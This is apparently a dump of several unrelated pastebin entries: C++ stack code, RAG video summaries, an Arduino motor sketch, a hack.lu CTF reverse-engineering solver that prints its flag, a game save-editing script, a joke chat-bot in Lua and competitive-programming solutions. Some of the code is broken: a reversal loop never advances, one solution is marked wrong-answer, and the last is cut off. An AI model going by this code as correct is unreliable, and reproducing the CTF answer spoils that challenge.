  bool current_stack = true;

  while (current_stack || current_node != nullptr) {
    if (min_stack.Empty() || current_node->value <= min_stack.GetHead().second) {
      min_stack.Push(current_node->value);
    }

    if (current_node->next_node == nullptr && current_stack) {
      current_node->next_node = other.GetFirstNode();
      current_stack = false;
    }

    current_node = current_node->next_node;
  }

  return min_stack;
}

template <typename T>
Stack<T> Stack<T>::GetReversedStack()
{
  Stack<T> reversed_stack;

  Node* current_node = head_;

  while (current_node != nullptr) {
    reversed_stack.Push(current_node->value);
  }

  return reversed_stack;
}"
Qr2Rfyqv,LM Studio + AnythingLLM: Process Local Documents with RAG Like a Pro!,AmourSpirit,Markdown,Sunday 19th of October 2025 05:28:58 PM CDT,"# LM Studio + AnythingLLM: Process Local Documents with RAG Like a Pro!

## Summary

This video tutorial demonstrates how to use LM Studio and Anything LLM to query local data using a Retrieval-Augmented Generation (RAG) system. The presenter uses Basecamp API documentation as an example dataset.

The process begins by setting up LM Studio: selecting and running a local Llama model, then starting a server from the developer tab. Next, the user configures Anything LLM to connect with LM Studio as the LLM provider, using default embedding settings and LanceDB for the vector database.

After creating a workspace named ""Basecamp RAG,"" the presenter imports Basecamp API documentation files into Anything LLM. The system processes these documents into the vector database without requiring coding. Once setup is complete, the presenter tests the system by asking for the curl command for ""get Todo,"" and the system correctly retrieves the exact command from the imported documentation.

The tutorial emphasizes that this approach allows users to query any local documents (books, pamphlets, or other files) using their own locally-run language model, providing a private, customizable alternative to cloud-based services.

## Details

- Duration: 7m 20s
- URL: [LM Studio + AnythingLLM: Process Local Documents with RAG Like a Pro!](https://www.youtube.com/watch?v=UG8uftJXcNs)

## Tags
- LMStudio
- AnythingLLM
- RAG
- LocalDocuments
- VectorDatabase
- LlamaModel
- PrivateAI
- DocumentProcessing
- YouTube
- Video
- LocalLLM,LocalAI
"
egEDy9yt,Arduino Motors rev_01,pleasedontcode,Arduino,Sunday 19th of October 2025 05:15:33 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: Arduino Motors
	- Source Code NOT compiled for: Arduino Uno
	- Source Code created on: 2025-10-19 22:13:50

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* i dosnt work help me */
/****** END SYSTEM REQUIREMENTS *****/


/* START CODE */

#include <L298NX2.h>

// Pin definitions for dual motor control (A and B) on UNO
const unsigned int EN_A = 3;
const unsigned int IN1_A = 5;
const unsigned int IN2_A = 6;
const unsigned int IN1_B = 7;
const unsigned int IN2_B = 8;
const unsigned int EN_B = 9;

// Initialize motor driver for two motors
L298NX2 motors(EN_A, IN1_A, IN2_A, EN_B, IN1_B, IN2_B);

void setup()
{
  Serial.begin(9600);
  // Wait for serial monitor to be opened (not strictly needed on UNO, but keeps behavior similar to other boards)
  while (!Serial)
  {
    // do nothing
  }

  // Set an initial speed for both motors
  motors.setSpeed(150);
  Serial.println(F(""L298NX2 Motor Controller Ready. Commands: F Forward, B Backward, S Stop, L Left, R Right, U/D for Motor A, 2/3 for Motor B, + / - global speed""));
}

void loop()
{
  if (Serial.available() > 0)
  {
    char cmd = Serial.read();
    switch (cmd)
    {
      case 'F':
        motors.forward();
        Serial.println(F(""Forward""));
        break;
      case 'B':
        motors.backward();
        Serial.println(F(""Backward""));
        break;
      case 'S':
        motors.stop();
        Serial.println(F(""Stop""));
        break;
      case 'L':
        // Turn left: left motor forward, right motor backward
        motors.forwardA();
        motors.backwardB();
        Serial.println(F(""Turn Left""));
        break;
      case 'R':
        // Turn right: left motor backward, right motor forward
        motors.backwardA();
        motors.forwardB();
        Serial.println(F(""Turn Right""));
        break;
      case 'U':
        // Increase speed of Motor A
        {
          unsigned short sA = motors.getSpeedA();
          if (sA + 5 <= 255) motors.setSpeedA(sA + 5);
          else motors.setSpeedA(255);
          Serial.print(F(""SpeedA = ""));
          Serial.println(motors.getSpeedA());
        }
        break;
      case 'D':
        // Decrease speed of Motor A
        {
          unsigned short sA = motors.getSpeedA();
          if (sA >= 5) motors.setSpeedA(sA - 5);
          else motors.setSpeedA(0);
          Serial.print(F(""SpeedA = ""));
          Serial.println(motors.getSpeedA());
        }
        break;
      case '2':
        // Increase speed of Motor B
        {
          unsigned short sB = motors.getSpeedB();
          if (sB + 5 <= 255) motors.setSpeedB(sB + 5);
          else motors.setSpeedB(255);
          Serial.print(F(""SpeedB = ""));
          Serial.println(motors.getSpeedB());
        }
        break;
      case '3':
        // Decrease speed of Motor B
        {
          unsigned short sB = motors.getSpeedB();
          if (sB >= 5) motors.setSpeedB(sB - 5);
          else motors.setSpeedB(0);
          Serial.print(F(""SpeedB = ""));
          Serial.println(motors.getSpeedB());
        }
        break;
      case '+':
        // Increase global (both) speed
        {
          unsigned short s = motors.getSpeed();
          if (s + 5 <= 255) motors.setSpeed(s + 5);
          else motors.setSpeed(255);
          Serial.print(F(""Global speed = ""));
          Serial.println(motors.getSpeed());
        }
        break;
      case '-':
        // Decrease global (both) speed
        {
          unsigned short s = motors.getSpeed();
          if (s >= 5) motors.setSpeed(s - 5);
          else motors.setSpeed(0);
          Serial.print(F(""Global speed = ""));
          Serial.println(motors.getSpeed());
        }
        break;
      default:
        Serial.print(F(""Unrecognized command: ""));
        Serial.println(cmd);
        break;
    }
  }
}

/* END CODE */
"
iA7uF97T,hack.lu CTF 2025 - Rev: INSTRUCTIONS UNCLEAR,Xylitol,Python,Sunday 19th of October 2025 04:45:39 PM CDT,"# ================================================================
# Solveur pour le validateur ASM ""IKEA"" hack.lu CTF 2025 - Rev: INSTRUCTIONS UNCLEAR
# Solution by Hackgyver 2.0 & Claude.ai
# Ce que fait le code ASM:
# IN -> masquage -> substitution -> rolling-XOR -> permutation -> CAND
# Ensuite il vérifie si (CAND == c5d) alors PASS = 1 sinon PASS = 0
# Donc ce que nous devons faire:
# CAND -> dé-permutation -> annuler le rolling-XOR -> annuler la substitution -> dé-masquer -> IN
# ================================================================

# ASM: .ikea : constantes
FLEN  = 65  # Longueur du fichier / nombre total de bytes attendus en entrée
paX   = 23  # seed principale utilisée pour générer les clés
BLKSZ = 12  # Taille d'un bloc (les données sont traitées par paquets de 12 bytes)

# ASM: c5d, le flag encodé (la sortie que le programme attend)
c5d = [
225,204,82,249,67,214,139,164,154,116,172,47,62,84,45,3,47,104,35,84,93,44,
34,6,25,163,30,206,78,117,5,225,233,23,152,55,146,238,226,49,74,173,199,34,
15,78,84,81,161,96,220,110,128,201,46,27,123,41,191,6,123,58,89,119,69
]

# Petite table de correspondance (32 bytes) indiquant quel sous-tableau utiliser de la grosse table de substitution.
kallax = [3,0,0,2,0,0,4,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,1,0,0]

# La grosse table de substitution (8192 bytes)
billy = [
166,241,180,132,190,47,251,88,10,46,127,195,92,216,151,226,
103,173,3,218,0,14,199,119,228,111,214,104,131,252,134,152,
225,52,39,60,56,179,4,144,24,203,233,156,167,91,146,254,
73,27,187,123,113,40,83,41,1,81,22,202,201,176,100,158,
87,50,128,182,84,209,55,240,20,62,51,184,75,220,175,192,
12,172,5,204,61,186,30,154,255,101,213,208,67,145,23,36,
170,141,108,212,181,193,82,37,74,211,109,155,168,221,138,207,
121,130,198,9,188,164,124,249,217,157,110,139,210,229,8,116,
93,6,178,29,70,2,129,53,183,197,99,95,38,244,65,125,
85,49,194,94,11,219,148,215,115,223,26,140,44,245,19,15,
248,86,7,205,253,171,160,169,246,105,191,54,243,239,238,79,
13,242,143,72,68,25,227,97,34,31,161,196,32,147,126,78,
71,57,159,137,114,42,230,250,117,106,59,17,133,98,16,177,
136,90,232,174,80,206,185,234,107,76,35,162,237,58,200,163,
89,77,222,142,102,21,189,122,48,224,165,69,64,247,149,66,
18,236,153,135,96,33,28,235,231,150,120,118,112,63,45,43,
177,88,7,134,38,179,127,126,41,20,25,233,37,141,82,124,
215,206,128,237,239,19,227,180,83,248,249,165,57,228,232,161,
94,6,192,142,64,200,77,42,132,4,221,153,65,48,238,135,
89,27,70,122,13,210,16,155,160,119,17,240,242,188,251,51,
107,22,208,162,197,230,39,229,146,157,168,76,67,105,49,213,
96,241,109,104,87,125,68,44,66,140,26,136,143,203,245,211,
183,10,193,43,100,172,171,28,85,98,226,151,73,236,91,40,
198,110,219,114,117,111,23,60,101,244,62,0,47,186,175,174,
191,167,52,148,189,173,61,194,250,231,130,54,50,187,93,185,
9,218,255,214,149,106,32,145,71,31,209,202,29,154,118,190,
201,56,12,204,84,5,115,246,58,14,166,103,235,170,147,247,
53,196,2,99,3,92,199,150,97,46,30,131,35,176,81,78,
222,133,59,18,178,253,79,182,123,75,217,163,137,113,223,95,
21,252,63,195,158,121,36,34,205,184,224,129,102,11,8,243,
225,159,254,33,181,112,90,74,216,138,120,80,24,1,220,156,
139,72,55,207,164,86,69,234,169,144,108,15,212,152,116,45,
58,14,250,180,0,171,247,215,46,166,50,118,73,231,33,7,
223,79,242,113,61,88,177,2,147,202,18,15,167,152,101,27,
183,220,158,30,224,128,153,198,187,6,178,22,34,232,210,5,
191,219,110,226,244,9,117,45,248,245,8,71,161,124,205,105,
69,92,241,132,246,81,51,142,20,37,172,208,160,75,62,53,
42,13,236,193,80,144,181,151,155,235,170,141,59,189,41,148,
87,233,197,109,123,253,206,19,86,126,188,254,195,182,133,100,
130,55,116,201,4,112,131,225,96,125,114,60,176,194,149,21,
211,156,200,134,216,240,111,28,243,140,68,255,237,3,102,10,
64,207,238,12,67,32,29,99,239,162,164,174,120,115,90,190,
230,184,89,228,78,221,36,107,52,157,95,17,108,74,234,145,
185,54,154,229,76,251,94,23,218,137,204,26,136,70,222,186,
165,91,39,179,173,163,85,66,24,168,150,72,47,199,139,119,
217,169,122,82,40,214,213,175,252,56,209,146,63,57,11,138,
127,104,31,1,159,97,83,249,196,106,48,43,227,143,98,16,
212,135,121,84,44,35,203,129,93,38,25,192,103,77,65,49,
255,148,204,174,252,10,233,164,253,76,113,9,187,33,51,20,
87,196,59,193,27,221,116,40,107,37,69,38,172,129,56,72,
194,119,142,203,168,224,120,133,156,247,195,166,143,70,241,126,
118,90,191,186,235,234,104,100,210,34,207,152,246,208,229,109,
64,57,190,160,44,140,132,139,28,62,79,92,182,167,19,202,
238,60,111,228,213,163,189,237,14,135,13,58,15,150,81,48,
42,226,93,211,236,21,157,217,250,231,24,185,68,7,198,225,
138,219,192,249,171,105,242,26,106,77,197,95,200,245,180,201,
179,43,88,244,136,147,6,121,39,153,223,36,146,232,144,89,
161,251,218,178,181,215,12,78,22,230,176,159,169,99,80,17,
206,35,114,66,212,173,85,53,52,222,127,31,125,103,82,243,
71,8,155,83,29,0,108,254,18,154,84,177,115,94,214,101,
46,188,102,73,1,170,97,5,151,134,98,45,4,131,91,65,
54,32,16,205,141,49,220,158,137,124,112,23,2,209,130,67,
199,122,227,41,11,184,96,47,183,149,239,110,25,175,145,123,
50,30,240,165,74,55,3,216,128,117,63,248,162,86,75,61,
144,192,167,72,80,203,160,78,18,82,208,212,222,235,228,84,
161,12,5,73,132,239,89,252,56,21,233,102,187,231,36,2,
74,246,39,85,1,130,110,0,97,226,240,156,254,151,47,31,
205,137,150,224,64,79,206,123,75,159,202,111,214,183,193,220,
67,140,55,3,182,93,136,200,135,127,117,145,17,8,204,34,
38,115,100,255,114,26,43,249,68,46,25,186,44,19,91,210,
42,32,185,81,7,52,165,90,71,178,147,27,195,98,124,134,
216,163,177,45,103,62,170,173,108,139,146,232,10,229,121,131,
16,191,94,237,190,181,245,171,230,57,172,247,122,107,154,168,
169,213,217,209,238,241,201,194,225,95,158,20,133,86,40,128,
125,179,50,157,242,142,243,129,174,218,223,116,54,37,175,118,
99,24,13,104,23,164,120,184,119,66,180,87,77,253,244,251,
101,88,83,215,29,248,152,59,198,166,92,69,48,4,143,138,
76,30,176,250,65,49,211,199,221,109,227,22,162,113,41,11,
219,148,96,58,197,149,61,15,196,141,70,35,9,188,153,105,
33,6,234,207,155,126,51,28,236,189,112,106,63,60,53,14,
133,211,196,173,138,240,254,105,34,251,116,151,242,225,122,106,
127,120,33,36,40,56,130,156,252,207,29,219,227,100,149,46,
186,176,70,51,200,101,230,136,109,67,243,21,234,134,93,50,
150,64,74,19,24,141,155,168,241,25,18,16,171,175,121,201,
245,255,187,115,82,3,226,107,43,154,124,42,145,52,32,182,
91,157,62,237,76,75,220,1,45,85,218,193,54,2,35,253,
90,163,58,113,28,203,167,98,4,162,152,189,87,217,146,123,
49,89,0,41,192,13,214,61,9,47,205,222,147,38,231,246,
199,174,39,129,232,114,135,92,83,55,14,185,238,224,102,161,
78,53,216,159,190,65,131,165,139,80,158,81,212,63,140,79,
30,26,143,233,248,71,249,22,247,77,180,166,179,197,236,223,
244,66,6,125,183,170,137,213,160,86,250,195,119,27,12,208,
210,37,177,169,97,48,228,215,112,110,84,59,5,209,221,10,
229,144,103,11,153,72,198,164,118,69,7,191,132,104,23,172,
148,96,17,202,194,184,88,20,188,126,73,235,204,108,60,31,
15,8,178,128,94,44,206,111,95,68,239,181,142,117,99,57
]

# ----- Génération de clé et keystream RC4 (mod N)
# ASM: init_SA/ksa_a + init_SB/cult + prga_*
# KSA modifié, initialise un tableau S de taille N.
def ksa_mod(N, key):
    S = list(range(N))
    j = 0
    for i in range(N):
        j = (j + S[i] + key[i % len(key)]) % N
        S[i], S[j] = S[j], S[i]
    return S

# ASM: PRGA modifié, génère out_len octets de clé.
def prga_mod(S, N, out_len):
    i = 0
    j = 0
    out = []
    for _ in range(out_len):
        i = (i + 1) % N
        j = (j + S[i]) % N
        S[i], S[j] = S[j], S[i]
        t = (S[i] + S[j]) % N
        out.append(S[t])
    return out


# ----- Fonctions auxiliaires pour les paramètres par bloc
def flags_for_block(bidx):
# ASM: stackfault: Calcule les drapeaux et options (use_billy, use_roll) pour un bloc donné.
    flags = (paX + 3*bidx + 0x5A) & 0xFF
    use_billy = flags % 2
    use_roll = 1 if (flags % 4) > 1 else 0  # cmp 1, t5; jl set_roll
    return flags, use_billy, use_roll

def billy_slice_index(bidx):
# ASM: steuerfahndung: Détermine quel sous-tableau de 'billy' utiliser pour ce bloc.
    billy_id = (paX + 3*bidx) % 32
    return kallax[billy_id]  # renvoie une valeur entre 0 et 5


# ----- Inversion complète d’un bloc de transformation (permute^-1 -> roll^-1 -> billy^-1 -> prga_mask^-1)
def invert_block(block_cand, bidx):
    lenb = len(block_cand)

    # 1: Annuler la permutation (Fisher–Yates inversée)
    # ASM: stage_perm -> init_SP/ksa_sp/prga_sp -> permute (BADRING)
    PK0 = (paX + 13*bidx + 57) & 0xFF
    PK1 = (paX + 17*bidx + 91) & 0xFF
    SP = ksa_mod(97, [PK0, PK1])  # ASM: init_SP / ksa_sp
    RND = prga_mod(SP, 97, lenb)  # ASM: prga_sp -> RND

    blk = block_cand[:]
    # La permutation directe est descendante -> pour inverser, on parcourt en ordre croissant (BADRING en sens inverse)
    for idx in range(lenb):
        j = RND[idx] % (idx + 1)
        blk[idx], blk[j] = blk[j], blk[idx]

    # 2: Annuler le rolling XOR (si activé, l'inverse de do_roll dans tombola si use_roll)
    _, use_billy, use_roll = flags_for_block(bidx)
    if use_roll:
        acc = (paX + 3*bidx + 17) & 0xFF
        step = (paX + 5*bidx + 1) & 0xFF
        for i in range(lenb):
            y = blk[i]
            x = y ^ acc
            blk[i] = x
            acc = (acc + x + step) & 0xFF

    # 3: Annuler la substitution (si activée, l'innverse de stage_billy/billy_apply)
    # 3: ASM: stage_billy -> do_billy -> billy_apply : substitution via billy[base+byte]
    if use_billy:
        idx_slice = billy_slice_index(bidx)
        base = 256 * idx_slice
        sbox = billy[base:base + 256]
        inv = [0]*256
        for x, y in enumerate(sbox):
            inv[y] = x
        blk = [inv[val] for val in blk]

    # 4: Annuler le masquage (double XOR avec flux RC4, prga_mask)
    # ASM: prga_mask : double XOR RC4 (mod 97 puis mod 89)
    KA0 = (paX + 7*bidx + 11) & 0xFF
    KA1 = (paX ^ 0xA5) & 0xFF
    SA = ksa_mod(97, [KA0, KA1])
    kA = prga_mod(SA, 97, lenb)

    KB0 = (paX + 9*bidx + 23) & 0xFF
    KB1 = (5*paX + 0x3D) & 0xFF
    SB = ksa_mod(89, [KB0, KB1])
    kB = prga_mod(SB, 89, lenb)

    for i in range(lenb):
        blk[i] ^= kA[i]
        blk[i] ^= kB[i]

    return blk

# ----- Reconstruit tout l'input (les 65 bytes) bloc par bloc, ASM: checkin / blk_check / do_block / store_block / hotdogs
IN_recovered = [0]*FLEN
offset = 0
bidx = 0
while offset < FLEN:
    lenb = min(BLKSZ, FLEN - offset)
    block_cand = c5d[offset:offset + lenb]
    block_in = invert_block(block_cand, bidx)
    IN_recovered[offset:offset + lenb] = block_in
    offset += lenb
    bidx += 1

# ----- Affiche le résultat final.
flag = ''.join(chr(b) for b in IN_recovered)
print(""Flag:"", flag)
# Flag : flag{br3_unsTuUc7-d4_c3LInG_f4N_y33t--br00_1nStRuCT10N5_n0W_Cl3R}"
ZWuKgBMs,rePosition a NoMansSky Corvette,crispyking,Python,Sunday 19th of October 2025 04:31:20 PM CDT,"#!/usr/bin/python
""""""rePosition: read a NMS PersistentPlayerBases JSON array entry
    and add an offset to every Position entry in its Objects[] array.

    This is to re-align a Corvette ship to the station hangar's grid
    (which somehow got shifted in an update Sep 2025...?)

    Python Versions tested: 3.9

    Host OS Dependencies:

""""""

#==============================================================================
# Imports and definitions
from __future__ import print_function
import sys
import argparse
import json


#==============================================================================
# Args
def handle_args():
    """"""Parse args and return the resulting Namespace object.""""""

    parser = argparse.ArgumentParser(
        description=""rePosition items in an Objects array in a JSON file."",
        formatter_class=lambda prog: argparse.RawDescriptionHelpFormatter(
            prog, max_help_position=35),
        # NB: use add_help=False to prevent auto -h/--help
        epilog='''
This is to re-position an off-center Corvette in the hangar's build area
so that the ship's landing gear is located correctly on the grid it snaps to.

It reads from standard input (or -f FILE) and writes to standard output.

The Position property in Objects[] is in the order (y,z,x), where
positive x is in the direction toward front of the ship and
(0,0,0) is the yellow central crosshairs on the deck of the station build area.

To use this you need to know the (y,z,x) position of the object you want
positioned at exactly the center so it can be subtracted from every object.
To find this:
  1. First name your ship something besides the procedurally-generated name.
  2. Open the Raw JSON using NMSSaveEditor or NomNom.
  3. Open BaseContext/PlayerStateData
  3. Look in ShipOwnership for the entry with your name.  Remember the index.
  4. Look in PersistentPlayerBases for the entry with ""UserData"":<index>.
  5. Look for Objects entries with ObjectID = ^B_LND_xx; these are the
     landing gear.
     Find the one closest to the center (0,0,0) and remember its Position
     (y,z,x) to use as parameters to this program.
     If you don't have one in the center, you can work out the offset:
     the grid spacing is 4.0, so you can calculate the intended
     Position of your gear, and subtract that from the actual Position in
     the JSON to get the offset you need to use as parameters for this program.
  6. Copy the entire entry to use as input to this program.
  7. Run this program with the -O option and the offset parameters.
  8. Replace the Objects[] array in the entry with the output.
''')

    # Options
    parser.add_argument(
        '-d', '--debug', action='count',
        help=""Enable debug output and DEBUG logging to stderr."")
    parser.add_argument(
        '-v', '--verbose', action='count', default=1,
        help='''Increase verbosity (default=%(default)s/WARN).
The effective verbosity is the maximum of this and any defined in the
config file.
''')
    parser.add_argument(
        '-q', '--quiet', action='count', default=0,
        help=""Decrease verbosity."")
    parser.add_argument(
        '-n', '--norun', action='store_true',
        help=""Display what would be done instead of doing it."")
    parser.add_argument(
        '-D', '--dump', action='store_true',
        help=""Dump the active args and config and exit."")
    #parser.add_argument('-h', '--help', action='help')
    parser.add_argument('-f', '--file', dest='file',
                        default='-',
                        help=""Read JSON from FILE instead of stdin."")
    parser.add_argument(
        '-O', '--objects', action='store_true',
        help=""Only output the Objects array, ready to paste."")

    # Required positional args; NB: NMS Position order is (y, z, x)
    parser.add_argument('y', type=float )
    parser.add_argument('z', type=float )
    parser.add_argument('x', type=float )


    args = parser.parse_args()

    # fix verbose/quiet
    args.verbose -= args.quiet

    return args

#==============================================================================
def main():
    """"""The main program.  Parse args, initialize and run.""""""
    args = handle_args()

    if args.dump:
        print(""args:"")
        print(json.dumps(vars(args), indent=4))
        # sys.exit(0)


    # Read JSON
    with open(args.file, 'r') if args.file != ""-"" else sys.stdin as f:
        data = json.load(f)

    if args.dump:
        print(""data:"")
        print(json.dumps(data, indent=4))
        sys.exit(0)


    # Process Objects[]
    for obj in data['Objects']:
        pos = obj['Position']
        # re-Position it
        pos[0] = pos[0] - args.y
        pos[1] = pos[1] - args.z
        pos[2] = pos[2] - args.x


    # Write JSON
    with sys.stdout as f:
        if args.objects:
            objstr = json.dumps({""Objects"": data['Objects']}, indent=4)
            objstr = objstr[2:-2]   # get rid of enclosing curly braces and nl
            objstr += "",\n""         # ready to paste
            sys.stdout.write(objstr)
        else:
            sys.stdout.write(json.dumps(data, indent=4))


#==============================================================================
if __name__ == ""__main__"":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(""caught interrupt"")
"
cgPtwbQe,Fart,ACheats,Lua,Sunday 19th of October 2025 02:23:33 PM CDT,"local caller = getScriptCaller()

local fart_types = {
  ""тихий, но смертоносный 💨"",
  ""мощный, с эхом по всей комнате 💥"",
  ""протяжный, как труба судного дня 📯"",
  ""осторожный, но подозрительно вонючий 🐍"",
  ""короткий, но звонкий как выстрел 🎯"",
  ""неожиданный, даже для тебя самого 😳"",
  ""с душой, прямо от сердца ❤️💨"",
  ""легендарный, оставивший след в истории 🏆"",
  ""пропитанный гордостью и фасолью 🫘"",
  ""едва слышный, но смертельно токсичный ☠️""
}

local fart_smells = {
  {name = ""свежий, как утренняя роса 🌸"", toxicity = 0},
  {name = ""немного подозрительный 😶‍🌫️"", toxicity = 1},
  {name = ""резкий, с привкусом фасоли 🫘"", toxicity = 2},
  {name = ""зловонный, заставил всех отвернуться 🤢"", toxicity = 3},
  {name = ""токсичный, зафиксирован на радарах НАТО ☣️"", toxicity = 4},
  {name = ""радиоактивный, оставил ожоги воздуха ☢️"", toxicity = 5}
}

function signRoll(num)
  local n = math.random(1,10)
  if n <= 7 then
    return num
  end
  return -num
end

function getDelta()
  local t = {}
  t.current = getLocalData(tostring(caller.id))
  if not t.current then t.current = 0 end
  t.delta = math.random(0, 10)
  t.delta = signRoll(t.delta)
  if t.current + t.delta < 0 then
    t.delta = -t.current
    t.current = 0
  else
    t.current = t.current + t.delta
  end
  setLocalData(tostring(caller.id), t.current)
  return t
end

function updateTime()
  setLocalData(tostring(caller.id) .. 'time', os.time())
end

function checkTime()
  local time = getLocalData(tostring(caller.id) .. 'time')
  if not time then
    setLocalData(tostring(caller.id), 0)
    updateTime()
    return true
  end
  if time and os.time() - tonumber(time) > 24*60*60 then
    updateTime()
    return true
  end
  return false 
end

function fart()
  if isChat() then
    local tag = ''
    if caller.username then
      tag = '@' .. caller.username .. ' '
    elseif caller.first_name then
      tag = caller.first_name .. ' '
    end
    if checkTime() then
      local t = getDelta()
      local fart_type = fart_types[math.random(1, #fart_types)]
      local fart_smell = fart_smells[math.random(1, #fart_smells)]
      
      local str = tag
      if t.delta < 0 then
        str = str .. 'сегодня пукнул слабее на ' .. -t.delta .. ' очков 💨\n'
      elseif t.delta == 0 then
        str = str .. 'сегодня не пукал. 😶\n'
      else
        str = str .. 'пукнул сильнее на ' .. t.delta .. ' очков! 💪\n'
      end
      
      str = str .. 'Тип пука: ' .. fart_type .. '\n'
      str = str .. 'Запах: ' .. fart_smell.name .. '\n'
      str = str .. 'Токсичность: ' .. fart_smell.toxicity .. '/5 ☠️\n'
      str = str .. 'Общий рейтинг пуков: ' .. t.current .. ' 💨'
      return str
    else
      return os.date(tag .. 'ты уже пукал сегодня! Возвращайся через %H часов %M минут 💨', 45*60*60 - os.time() + tonumber(getLocalData(tostring(caller.id .. 'time'))))
    end
  else
    return 'Юзай в чате, чтобы все услышали твой пук! 💨'
  end
end

function printTop()
  local t = getAllUserData()
  local s = '💨 ТОП ПУКАНОВ ЧАТА 💨\n\n'
  if not getUserCount() then
    return 'Используй в конфе!'
  end
  for i = 1, getUserCount() do
    if t[i] and t[i].id and getLocalData(tostring(t[i].id)) then
      t[i].score = tonumber(getLocalData(tostring(t[i].id)))
    else
      t[i] = nil
    end
  end
  local c = {}
  for i = 1, getUserCount() do
    if t[i] then
      table.insert(c, t[i])
    end
  end
  table.sort(c, function(a,b) return a.score > b.score end)
  for i = 1, #c do
    if c[i].first_name then
      s = s .. i .. '. ' .. c[i].first_name .. ' — ' .. c[i].score .. ' очков пука 💨\n'
    end
  end
  return s
end

if _ARGS == 'top' or _ARGS == 'топ' then
  return printTop()
end

return fart()"
p2dPAKEh,RAG Crash Course for Beginners,AmourSpirit,Markdown,Sunday 19th of October 2025 01:22:36 PM CDT,"# RAG Crash Course for Beginners

## Summary

Based on the transcript, this video is a comprehensive educational course about RAG (Retrieval-Augmented Generation) systems. Here's a clear summary:

**Course Overview**
This video provides a complete introduction to RAG systems, designed for beginners with no prior AI or programming knowledge. The course combines theoretical explanations with hands-on labs that run directly in the browser.

**Core Concepts Covered**

**What is RAG?**
RAG stands for Retrieval-Augmented Generation and solves the problem of AI models providing incorrect or generic answers by:
- **Retrieval**: Finding relevant information from documents
- **Augmentation**: Adding that information to the user's prompt
- **Generation**: Having the AI generate accurate responses using the retrieved context

The course uses a practical example of building a ""policy copilot"" chatbot that answers employee questions about company policies.

**Key Components Explained**

1. **Search Methods**:
   - **Keyword Search**: Traditional search using exact word matching (TF-IDF, BM25)
   - **Semantic Search**: Understanding meaning using embedding models

2. **Embedding Models**:
   - Convert text to numerical vectors representing meaning
   - Local models (Sentence Transformers) vs. API models (OpenAI)
   - Demonstrated using the all-miniLM-L6-v2 model

3. **Vector Databases**:
   - Efficiently store and search embeddings
   - Introduced ChromaDB for learning and Pinecone for production

4. **Document Chunking**:
   - Breaking large documents into smaller, searchable pieces
   - Strategies: fixed-size chunks, sentence-based, paragraph-based
   - Importance of overlap to preserve context

**Production Considerations**
The course covers essential production topics:
- **Caching**: Multiple levels (query, embedding, search, LLM response)
- **Monitoring**: Tracking response times, error rates, retrieval quality
- **Error Handling**: Graceful degradation and fallback strategies
- **Architecture**: Complete production setup with microservices and monitoring

**Hands-on Approach**
The course emphasizes practical learning with instant browser-based labs that allow students to:
- Practice keyword and semantic search
- Work with embedding models
- Implement vector databases
- Build complete RAG pipelines
- No environment setup required

The video positions RAG as a powerful solution for dynamic, factual information retrieval while acknowledging it's not suitable for all AI problems - recommending prompt engineering for behavior control and fine-tuning for stable patterns like communication style.

## Details

- Duration: 58m 50s
- URL: [RAG Crash Course for Beginners](https://www.youtube.com/watch?v=swvzKSOEluc)

## Tags
- RAG
- RetrievalAugmentedGeneration
- AIBeginners
- VectorDatabases
- SemanticSearch
- EmbeddingModels
- DocumentChunking
- ProductionAI
- YouTube
- Video
- LocalLLM,LocalAI
"
DCvc421G,CF2154C1 WA,pb_jiang,C++,Sunday 19th of October 2025 01:22:24 PM CDT,"// Problem: C1. No Cost Too Great (Easy Version)
// Contest: Codeforces - Codeforces Round 1060 (Div. 2)
// URL: https://codeforces.com/contest/2154/problem/C1
// Memory Limit: 256 MB
// Time Limit: 3000 ms
//
// Powered by CP Editor (https://cpeditor.org)

#include <assert.h>
#include <bits/stdc++.h>
using namespace std;
#ifndef __DEBUG__
#define dbg(...) 42
#endif
template <class T> using mpq = priority_queue<T, vector<T>, greater<T>>;

namespace rngs = std::ranges;
using ll = long long;
using a2l = array<ll, 2>;
using vl = vector<ll>;

void solve2()
{
    ll n;
    cin >> n;
    vl a(n), b(n);
    for (auto &x : a)
        cin >> x;
    for (auto &x : b)
        cin >> x;
}

vl ps;

void solve()
{
    ll n, ecnt = 0;
    cin >> n;
    vl a(n), b(n);
    map<ll, ll> pcnt, p1cnt;
    for (auto &x : a)
        cin >> x;
    for (auto &x : b)
        cin >> x;

    for (auto x : a) {
        for (auto f : ps) {
            if (f * f > x) {
                if (std::binary_search(ps.begin(), ps.end(), x))
                    pcnt[x] += 1;
                if (std::binary_search(ps.begin(), ps.end(), x + 1))
                    p1cnt[x + 1] += 1;
                break;
            }

            if (x % f == 0)
                pcnt[f] += 1;
            if ((x + 1) % f == 0)
                p1cnt[f] += 1;
        }
    }

    ll val = 2;
    for (auto [k, v] : pcnt) {
        if (v >= 2)
            dbg(k, v, val), val = 0;
        if (v == 1 && p1cnt.count(k))
            val = min(val, 1ll);
        if (p1cnt.count(k) && p1cnt[k] >= 2)
            val = min(val, 2ll);
        // val = min(val, 2 - min(v, 2ll));
    }

    cout << val << '\n';
}

int main(int argc, char **argv)
{
    std::ios::sync_with_stdio(false);
    std::cin.tie(nullptr);

    for (ll i = 2; i < 2e5 + 3; ++i) {
        bool is_prime = true;
        for (ll j = 2; j * j <= i && is_prime; ++j)
            if (i % j == 0)
                is_prime = false;
        if (is_prime)
            ps.push_back(i);
    }

    ll t = 1;
    cin >> t;
    while (t--)
        solve();

    return 0;
};
"
kib2PHV3,C1-Bilol_Abdilxayev,Bilolabdulkhayev2006,C++,Sunday 19th of October 2025 12:30:30 PM CDT,"#include <bits/stdc++.h>
using namespace std;
using ll = long long;
 
vector<int> sieve_primes(int limit) {
    vector<char> is_prime(limit + 1, true);
    vector<int> primes;
    is_prime[0] = is_prime[1] = false;
    for (int i = 2; i <= limit; ++i) {
        if (is_prime[i]) {
            primes.push_back(i);
            if ((ll)i * i <= limit) {
                for (int j = i * i; j <= limit; j += i) is_prime[j] = false;
            }
        }
    }
    return primes;
}
 
vector<ll> factor_unique(ll x, const vector<int>& primes) {
